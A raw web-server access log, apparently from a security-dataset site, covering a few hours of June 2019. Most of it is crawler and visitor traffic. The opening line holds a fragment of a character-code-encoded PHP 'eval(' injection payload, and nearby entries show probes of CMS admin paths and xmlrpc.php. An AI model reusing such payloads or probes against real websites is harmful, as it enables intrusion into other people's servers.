rs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:21 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
180.150.226.197 - - [26/Jun/2019:10:09:21 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 404 271 "http://www.secrepo.com/e/DoInfo/ecms.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
54.36.148.140 - - [26/Jun/2019:10:10:58 -0700] "GET /self.logs/2016/access.log.2016-06-02.gz HTTP/1.1" 200 11189 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
40.77.167.219 - - [26/Jun/2019:10:13:07 -0700] "GET /self.logs/access.log.2018-04-07.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
189.206.239.114 - - [26/Jun/2019:10:13:27 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928482 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.170" 
207.46.13.194 - - [26/Jun/2019:10:17:26 -0700] "GET /self.logs/access.log.2019-04-22.gz HTTP/1.1" 200 19409 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.201 - - [26/Jun/2019:10:18:58 -0700] "GET /self.logs/ HTTP/1.1" 200 16750 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
70.224.68.147 - - [26/Jun/2019:10:19:14 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
70.224.68.147 - - [26/Jun/2019:10:19:14 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
70.224.68.147 - - [26/Jun/2019:10:19:14 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
70.224.68.147 - - [26/Jun/2019:10:19:15 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
113.171.224.176 - - [26/Jun/2019:10:22:33 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
128.229.4.2 - - [26/Jun/2019:10:25:38 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
128.229.4.2 - - [26/Jun/2019:10:25:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
128.229.4.2 - - [26/Jun/2019:10:25:50 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
128.229.4.2 - - [26/Jun/2019:10:25:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
41.223.160.131 - - [26/Jun/2019:10:29:24 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 140 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
192.76.175.3 - - [26/Jun/2019:10:31:26 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
192.76.175.3 - - [26/Jun/2019:10:31:26 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
192.76.175.3 - - [26/Jun/2019:10:31:26 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
192.76.175.3 - - [26/Jun/2019:10:31:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
54.36.150.39 - - [26/Jun/2019:10:32:34 -0700] "GET /self.logs/access.log.2015-02-06.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [26/Jun/2019:10:33:07 -0700] "GET /self.logs/access.log.2018-04-20.gz HTTP/1.1" 200 17504 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:33:09 -0700] "GET /self.logs/access.log.2018-07-18.gz HTTP/1.1" 200 45759 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
103.229.124.89 - - [26/Jun/2019:10:33:10 -0700] "GET /xmlrpc.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0" 
216.244.66.245 - - [26/Jun/2019:10:33:12 -0700] "GET /self.logs/access.log.2018-07-25.gz HTTP/1.1" 200 25132 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:33:14 -0700] "GET /self.logs/error.log.2018-09-11.gz HTTP/1.1" 200 7494 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
192.76.175.3 - - [26/Jun/2019:10:34:56 -0700] "GET /favicon.ico HTTP/1.1" 200 302 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
216.244.66.245 - - [26/Jun/2019:10:36:54 -0700] "GET /self.logs/2015/access.log.2015-09-12.gz HTTP/1.1" 200 4000 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:36:55 -0700] "GET /self.logs/2015/access.log.2015-10-25.gz HTTP/1.1" 200 4367 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:36:57 -0700] "GET /self.logs/2015/error.log.2015-04-26.gz HTTP/1.1" 200 794 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:36:58 -0700] "GET /self.logs/2015/error.log.2015-05-18.gz HTTP/1.1" 200 766 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:36:59 -0700] "GET /self.logs/2015/error.log.2015-09-20.gz HTTP/1.1" 200 750 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:37:01 -0700] "GET /self.logs/2015/error.log.2015-11-23.gz HTTP/1.1" 200 515 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:37:02 -0700] "GET /self.logs/2016/access.log.2016-05-13.gz HTTP/1.1" 200 13454 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:37:04 -0700] "GET /self.logs/2016/access.log.2016-06-23.gz HTTP/1.1" 200 6968 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:37:05 -0700] "GET /self.logs/2016/access.log.2016-08-25.gz HTTP/1.1" 200 6160 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:37:06 -0700] "GET /self.logs/2016/error.log.2016-08-03.gz HTTP/1.1" 200 1519 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:10:37:07 -0700] "GET /self.logs/2016/error.log.2016-12-21.gz HTTP/1.1" 200 1248 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.23 - - [26/Jun/2019:10:42:09 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 304 177 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.142 - - [26/Jun/2019:10:48:32 -0700] "GET /self.logs/error.log.2018-10-20.gz HTTP/1.1" 200 4103 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [26/Jun/2019:10:52:59 -0700] "GET /robots.txt HTTP/1.1" 200 244 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
4.14.236.6 - - [26/Jun/2019:10:53:26 -0700] "GET / HTTP/1.1" 301 438 "-" "Python-urllib/3.7" 
4.14.236.6 - - [26/Jun/2019:10:53:26 -0700] "GET / HTTP/1.1" 200 46409 "-" "Python-urllib/3.7" 
189.206.239.114 - - [26/Jun/2019:10:53:54 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.170" 
189.206.239.114 - - [26/Jun/2019:10:53:54 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.170" 
189.206.239.114 - - [26/Jun/2019:10:54:08 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928482 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.170" 
66.67.19.49 - - [26/Jun/2019:10:56:51 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
66.67.19.49 - - [26/Jun/2019:10:56:51 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
66.67.19.49 - - [26/Jun/2019:10:56:51 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
207.46.13.23 - - [26/Jun/2019:11:02:23 -0700] "GET /self.logs/access.log.2017-09-17.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.201 - - [26/Jun/2019:11:03:52 -0700] "GET /self.logs/error.log.2017-05-25.gz HTTP/1.1" 200 760 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.67.19.49 - - [26/Jun/2019:11:04:12 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
66.67.19.49 - - [26/Jun/2019:11:04:12 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
216.244.66.245 - - [26/Jun/2019:11:05:10 -0700] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 200 4986 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.23 - - [26/Jun/2019:11:16:31 -0700] "GET /self.logs/access.log.2017-12-02.gz HTTP/1.1" 200 15244 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.245 - - [26/Jun/2019:11:21:29 -0700] "GET /self.logs/access.log.2018-05-15.gz HTTP/1.1" 200 45248 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:21:31 -0700] "GET /self.logs/error.log.2017-12-02.gz HTTP/1.1" 200 1753 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:21:34 -0700] "GET /self.logs/error.log.2018-08-25.gz HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.149.14 - - [26/Jun/2019:11:22:22 -0700] "GET /self.logs/2015/error.log.2015-04-16.gz HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
213.208.193.76 - - [26/Jun/2019:11:22:58 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
140.82.10.185 - - [26/Jun/2019:11:24:32 -0700] "GET / HTTP/1.0" 301 438 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
140.82.10.185 - - [26/Jun/2019:11:24:32 -0700] "GET / HTTP/1.0" 200 46409 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
113.171.224.176 - - [26/Jun/2019:11:24:33 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
216.244.66.245 - - [26/Jun/2019:11:25:06 -0700] "GET /self.logs/2015/access.log.2015-02-23.gz HTTP/1.1" 200 10509 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:08 -0700] "GET /self.logs/2015/access.log.2015-05-07.gz HTTP/1.1" 200 6097 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:08 -0700] "GET /self.logs/2015/access.log.2015-05-20.gz HTTP/1.1" 200 4805 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:10 -0700] "GET /self.logs/2015/error.log.2015-01-20.gz HTTP/1.1" 200 912 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:11 -0700] "GET /self.logs/2015/error.log.2015-06-20.gz HTTP/1.1" 200 514 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:12 -0700] "GET /self.logs/2015/error.log.2015-07-07.gz HTTP/1.1" 200 606 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:13 -0700] "GET /self.logs/2015/error.log.2015-07-15.gz HTTP/1.1" 200 697 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:14 -0700] "GET /self.logs/2015/error.log.2015-12-23.gz HTTP/1.1" 200 711 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:15 -0700] "GET /self.logs/2016/access.log.2016-04-30.gz HTTP/1.1" 200 7529 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:16 -0700] "GET /self.logs/2016/access.log.2016-06-27.gz HTTP/1.1" 200 9013 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:17 -0700] "GET /self.logs/2016/access.log.2016-07-27.gz HTTP/1.1" 200 15164 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:18 -0700] "GET /self.logs/2016/access.log.2016-07-29.gz HTTP/1.1" 200 6706 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:19 -0700] "GET /self.logs/2016/error.log.2016-02-10.gz HTTP/1.1" 200 653 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:20 -0700] "GET /self.logs/2016/error.log.2016-04-19.gz HTTP/1.1" 200 956 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:21 -0700] "GET /self.logs/2016/error.log.2016-04-20.gz HTTP/1.1" 200 731 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:11:25:23 -0700] "GET /self.logs/2016/error.log.2016-12-24.gz HTTP/1.1" 200 932 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.149.29 - - [26/Jun/2019:11:26:57 -0700] "GET /self.logs/error.log.2016-08-03.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
106.120.173.159 - - [26/Jun/2019:11:27:00 -0700] "GET /robots.txt HTTP/1.1" 200 251 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
157.55.39.201 - - [26/Jun/2019:11:27:33 -0700] "GET /self.logs/access.log.2017-02-08.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.120.173.159 - - [26/Jun/2019:11:28:25 -0700] "GET / HTTP/1.1" 304 138 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
54.36.148.169 - - [26/Jun/2019:11:31:13 -0700] "GET /self.logs/error.log.2016-01-31.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
64.233.173.17 - - [26/Jun/2019:11:31:40 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (Linux; Android 6.0; Lenovo A7010a48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" 
64.233.173.19 - - [26/Jun/2019:11:31:41 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; Lenovo A7010a48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" 
64.233.173.19 - - [26/Jun/2019:11:31:41 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; Lenovo A7010a48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" 
64.233.173.17 - - [26/Jun/2019:11:31:42 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; Lenovo A7010a48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" 
216.244.66.245 - - [26/Jun/2019:11:41:21 -0700] "GET /robots.txt HTTP/1.1" 200 244 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
140.82.10.185 - - [26/Jun/2019:11:44:57 -0700] "GET / HTTP/1.0" 301 438 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
140.82.10.185 - - [26/Jun/2019:11:44:57 -0700] "GET / HTTP/1.0" 200 46409 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
183.83.159.194 - - [26/Jun/2019:11:45:19 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
183.83.159.194 - - [26/Jun/2019:11:45:20 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
183.83.159.194 - - [26/Jun/2019:11:45:20 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
183.83.159.194 - - [26/Jun/2019:11:45:20 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
183.83.159.194 - - [26/Jun/2019:11:45:21 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
100.43.90.103 - - [26/Jun/2019:11:46:36 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [26/Jun/2019:11:46:40 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=M;O=D HTTP/1.1" 200 753 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
46.118.155.82 - - [26/Jun/2019:11:55:41 -0700] "GET /Datasets%20Description/Network/ HTTP/1.1" 200 1546 "https://ukr.belreferatov.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
46.118.155.82 - - [26/Jun/2019:11:55:42 -0700] "GET /Datasets%20Description/Network/ HTTP/1.1" 200 1546 "https://ukr.belreferatov.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
46.118.155.82 - - [26/Jun/2019:11:55:43 -0700] "GET /Datasets%20Description/Network/ HTTP/1.1" 200 1546 "https://ukr.belreferatov.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
209.58.142.160 - - [26/Jun/2019:12:04:29 -0700] "GET / HTTP/1.1" 200 12538 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
54.36.150.55 - - [26/Jun/2019:12:05:20 -0700] "GET /self.logs/access.log.2017-11-07.gz HTTP/1.1" 200 51655 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
27.6.153.248 - - [26/Jun/2019:12:05:44 -0700] "GET / HTTP/1.1" 200 12538 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1" 
216.244.66.245 - - [26/Jun/2019:12:07:37 -0700] "GET /self.logs/access.log.2018-05-14.gz HTTP/1.1" 200 21325 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:07:39 -0700] "GET /self.logs/access.log.2018-05-29.gz HTTP/1.1" 200 33437 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:07:41 -0700] "GET /self.logs/access.log.2018-08-25.gz HTTP/1.1" 200 19018 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:07:43 -0700] "GET /self.logs/error.log.2018-06-10.gz HTTP/1.1" 200 7983 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:07:45 -0700] "GET /self.logs/error.log.2018-07-26.gz HTTP/1.1" 200 5965 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.23 - - [26/Jun/2019:12:07:45 -0700] "GET /self.logs/error.log.2017-03-24.gz HTTP/1.1" 200 982 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [26/Jun/2019:12:08:49 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 140 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
216.244.66.245 - - [26/Jun/2019:12:11:10 -0700] "GET /self.logs/2015/access.log.2015-01-28.gz HTTP/1.1" 200 2043 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:11 -0700] "GET /self.logs/2015/access.log.2015-02-26.gz HTTP/1.1" 200 3508 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:12 -0700] "GET /self.logs/2015/access.log.2015-03-27.gz HTTP/1.1" 200 3966 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
